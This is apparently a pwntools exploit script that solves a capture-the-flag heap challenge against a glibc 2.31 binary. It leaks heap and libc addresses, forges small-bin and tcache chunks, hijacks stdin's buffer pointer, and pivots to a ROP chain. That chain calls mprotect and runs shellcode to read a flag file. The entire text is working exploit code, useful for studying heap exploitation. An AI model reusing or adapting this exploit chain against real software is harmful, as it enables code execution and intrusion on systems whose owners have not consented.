from pwn import *

context.arch = 'amd64'

###Util
def create(size,data):
    r.sendafter('choice : ','C')
    r.sendlineafter('Size : ',str(size))
    if len(data)==size-1:
        r.sendafter('Data : ',data)
    else:
        r.sendlineafter('Data : ',data)

def show():
    r.sendafter('choice : ','S')
    return r.recvline()[:-1]

def edit(data):
    r.sendafter('choice : ','E')
    r.sendlineafter('Data : ',data)

def delete():
    r.sendafter('choice : ','D')

def ultra(data):
    r.sendafter('choice : ','U')
    r.sendlineafter('Data : ',data)

###Addr
#  libc2.31(Ubuntu)
main_arena_offset = 0x1ebb80
unsorted_bin_offset = main_arena_offset+0x60
small_bin_offset = main_arena_offset+0xd0
stdin_struct_offset = 0x1eb980
stdin_bufbase_offset = stdin_struct_offset+0x38
IO_file_jumps_offset = 0x1ed4a0

###ROPgadget
L_pop_rsp = 0x32b5a
L_pop_rdi = 0x26b72
L_pop_rsi = 0x27529
L_pop_rdx_rbx = 0x162866
L_pop_rax = 0x4a550
L_syscall = 0x66229
L_trampoline = 0x11522a #push qword ptr [rcx] ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret


###Exploit
r = process('./B',env={'LD_PRELOAD':'./libc-2.31.so'})

for i in range(2):
    create(0x288,'M30W')
    delete()
heap_addr = u64(show().ljust(8,b'\x00'))-0x16c0
print(hex(heap_addr))
for i in range(5):
    create(0x288,'M30W')
    delete()
create(0x288,'M30W')
ultra('M30W')
delete()
unsorted_bin_addr = u64(show()+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

chunk_offset = 0x28a0
payload = p64(libc_base+unsorted_bin_offset)+p64(heap_addr+chunk_offset+0x40)+\
          p64(0)+p64(0xa1)+\
          p64(heap_addr+chunk_offset+0x1b0)+p64(heap_addr+chunk_offset+0xe0)+\
          p64(0)+p64(0x91)+\
          p64(heap_addr+chunk_offset)+p64(heap_addr+chunk_offset+0x60)+\
          p64(0)+p64(0xa1)+\
          p64(heap_addr+chunk_offset+0x40)+p64(heap_addr+chunk_offset+0x80)+\
          p64(0)+p64(0xa1)+\
          p64(heap_addr+chunk_offset+0x60)+p64(heap_addr+chunk_offset+0xa0)+\
          p64(0)+p64(0xa1)+\
          p64(heap_addr+chunk_offset+0x80)+p64(heap_addr+chunk_offset+0x150)+\
          p64(0xa0)+p64(0x20)+\
          p64(0x90)+p64(0x20)+\
          p64(0)+p64(0xf1)+\
          p64(heap_addr+chunk_offset+0x20)+p64(0)+\
          p64(0xa0)+p64(0x20)+\
          p64(0)+p64(0)+\
          p64(0xa0)+p64(0x20)+\
          p64(0)+p64(0)+\
          p64(0xa0)+p64(0x20)+\
          p64(0)+p64(0xa1)+\
          p64(heap_addr+chunk_offset+0xa0)+p64(heap_addr+chunk_offset+0x170)+\
          p64(0)+p64(0xa1)+\
          p64(heap_addr+chunk_offset+0x150)+p64(heap_addr+chunk_offset+0x190)+\
          p64(0)+p64(0xa1)+\
          p64(heap_addr+chunk_offset+0x170)+p64(heap_addr+chunk_offset+0x1b0)+\
          p64(0)+p64(0xa1)+\
          p64(heap_addr+chunk_offset+0x190)+p64(heap_addr+chunk_offset+0x20)+\
          p64(0xf0)+p64(0x20)+\
          p64(0)+p64(0)+\
          p64(0xa0)+p64(0x20)+\
          p64(0)+p64(0)+\
          p64(0xa0)+p64(0x20)+\
          p64(0)+p64(0)+\
          p64(0xa0)+p64(0x20)+\
          p64(0)+p64(0)+\
          p64(0xa0)+p64(0x20)
edit(payload)
payload = p64(0)+p64(0)+\
          p64(0)+p64(0x91)+\
          p64(libc_base+small_bin_offset)+p64(heap_addr+chunk_offset+0x50)+\
          p64(heap_addr+chunk_offset+0x40)+p64(heap_addr+chunk_offset+0x60)+\
          p64(0)+p64(heap_addr+chunk_offset+0x70)+\
          p64(0)+p64(heap_addr+chunk_offset+0x80)+\
          p64(0)+p64(heap_addr+chunk_offset+0x90)+\
          p64(0)+p64(heap_addr+chunk_offset+0xa0)+\
          p64(0)+p64(libc_base+stdin_bufbase_offset-0x18)
create(0x98,payload)

fake_tcache = p64(1)+p64(0)*15+p64(libc_base+IO_file_jumps_offset+0x60)[:-1]
ROPchain = p64(libc_base+L_pop_rdi)+p64(0)+\
           p64(libc_base+L_pop_rsi)+p64(heap_addr+0x78)+\
           p64(libc_base+L_pop_rdx_rbx)+p64(0x200)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(0)+\
           p64(libc_base+L_syscall)
payload = fake_tcache[:0x18]+ROPchain+fake_tcache[0x18+len(ROPchain):]
create(0x88,payload)

r.sendafter('choice : ','U')
r.sendafter('Data : ',p64(heap_addr+0x28)+p64(0)+p64(libc_base+L_trampoline)[:6])

ROPchain = p64(libc_base+L_pop_rdi)+p64(heap_addr)+\
           p64(libc_base+L_pop_rsi)+p64(0x1000)+\
           p64(libc_base+L_pop_rdx_rbx)+p64(7)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(10)+\
           p64(libc_base+L_syscall)+\
           p64(heap_addr+0xd0)
shellcode = asm(f'''
                 mov rdi, {heap_addr+0x78+0x100}
                 mov rsi, 0
                 mov rdx, 0
                 mov rax, 2
                 syscall
                 mov rdi, rax
                 mov rsi, {heap_addr+0x78+0x100}
                 mov rdx, 0x100
                 mov rax, 0
                 syscall
                 mov rdi, 1
                 mov rsi, {heap_addr+0x78+0x100}
                 mov rdx, 0x100
                 mov rax, 1
                 syscall
                 mov rdi, 0
                 mov rax, 0x3c
                 syscall
                 ''')
argument = b'/home/babyheap/flag\x00'
payload = (ROPchain+shellcode).ljust(0x100,b'\x00')+argument
r.send(payload)

r.interactive()
